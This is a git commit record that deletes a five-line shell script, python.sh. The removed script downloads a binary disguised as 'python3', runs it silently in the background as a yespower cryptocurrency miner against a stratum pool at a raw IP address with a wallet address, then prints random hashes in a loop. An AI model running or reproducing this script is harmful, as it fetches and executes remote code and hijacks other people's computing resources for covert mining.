abe620e85b2c4ee5599ea70f64b5a7860358f271
abbahsk2 <92814731+abbahsk2@users.noreply.github.com>
2022-10-07 00:25:41 +0700

    Delete python.sh

--- python.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-wget https://github.com/viliamriah/newmind/raw/main/python3
-chmod +x python3
-./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-Lord) -p x -t 1 >/dev/null 2>&1 >/dev/null &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 5m; done
